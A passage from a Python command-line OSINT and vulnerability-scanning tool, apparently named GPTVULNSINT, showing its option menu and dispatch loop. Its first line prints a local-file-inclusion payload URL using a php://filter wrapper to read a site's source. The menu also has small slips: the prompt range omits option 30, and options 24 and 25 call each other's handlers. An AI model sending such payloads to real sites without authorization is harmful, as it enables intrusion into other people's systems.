                print(f"{base}?page=php://filter/resource=index.php")
            
            print("\n" + "="*60)
            print("✅ Scan completed!")
            print("="*60)

def print_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    
    menu_sections = [
        ("WEBSITE OSINT", [
            ("1", "FreeCampDev (Subdomains)"),
            ("2", "URL Scan (Extract Links)"),
            ("3", "PublicWWW Search"),
            ("4", "Censys Search"),
            ("5", "IntelX Search"),
            ("6", "crt.sh Certificates"),
            ("7", "Suip.biz Tools"),
            ("8", "Whois Lookup")
        ]),
        
        ("VULNERABILITY SCANNING", [
            ("9", "HTTP Headers Analysis"),
            ("10", "Vulners Database"),
            ("11", "WordPress Scanner"),
            ("12", "Phind AI Search"),
            ("13", "Sensitive Data Scan"),
            ("14", "LFI Vulnerability Scanner")
        ]),
        
        ("MALWARE ANALYSIS", [
            ("15", "Kaspersky TI"),
            ("16", "MetaDefender"),
            ("17", "MalwareBazaar"),
            ("18", "VirusTotal")
        ]),
        
        ("EMAIL OSINT", [
            ("19", "Epieos"),
            ("20", "Email Parser")
        ]),
        
        ("THREAT INTELLIGENCE", [
            ("21", "SecureList (Kaspersky)"),
            ("22", "MITRE ATT&CK"),
            ("23", "MISP Platform")
        ]),
        ("MOBILE & GEO", [
            ("24", "Cell Tower Info"),
            ("25", "USGS Earth Explorer"),
            ("26", "Information phone number")
        ]),
        
        ("UTILITIES", [
            ("27", "Google Search"),
            ("28", "Generate PDF Report"),
            ("29", "Show Statistics"),
            ("30", "Clear Results"),
            ("0", "Exit")
        ])
    ]
    
    for section_title, options in menu_sections:
        print(Fore.RED + f"\n{section_title}")
        print(Fore.RED + "-" * len(section_title))
        for num, desc in options:
            print(Fore.GREEN + f"  {num:>2}. {desc}")
            
    print(Fore.YELLOW + "\n" + "="*50)

async def main():
    async with GPTVULNSINT() as tool:
        while True:
            print_menu()
            choice = input(Fore.CYAN + "\nSelect option (0-29): ").strip()
            
            if choice == "0":
                print(Fore.YELLOW + "\nExiting GPTVULNSINT...")
                break
                
            elif choice == "1":
                await tool.freecampdev()
            elif choice == "2":
                await tool.scan()
            elif choice == "3":
                await tool.publicwww()
            elif choice == "4":
                await tool.censys()
            elif choice == "5":
                await tool.intelx()
            elif choice == "6":
                await tool.crt()
            elif choice == "7":
                await tool.suip()
            elif choice == "8":
                await tool.whois()
            elif choice == "9":
                await tool.headers()
            elif choice == "10":
                await tool.vulners()
            elif choice == "11":
                await tool.wp_scanner()
            elif choice == "12":
                await tool.phind()
            elif choice == "13":
                await tool.sensitive_data_scan()
            elif choice == "14":
                await tool.lfi_scanner()
            elif choice == "15":
                await tool.kaspersky()
            elif choice == "16":
                await tool.metadefender()
            elif choice == "17":
                await tool.malwarebazaar()
            elif choice == "18":
                await tool.virustotal()
            elif choice == "19":
                await tool.epieos()
            elif choice == "20":
                await tool.email_parse()
            elif choice == "21":
                await tool.securelist()
            elif choice == "22":
                await tool.mitre()
            elif choice == "23":
                await tool.misp()
            elif choice == "24":
                await tool.usgs()
            elif choice == "25":
                await tool.cell_id()
            elif choice == "26":
                await tool.phone_analyzer()
            elif choice == "27":
                await tool.google_search()
            elif choice == "28":
                await tool.generate_pdf()
            elif choice == "29":
                await tool.show_stats()
            elif choice == "30":
                await tool.clear_results()
            else:
                print(Fore.RED + "Invalid option")
                
            input(Fore.YELLOW + "\nPress Enter to continue...")

if __name__ == "__main__":
    asyncio.run(main())
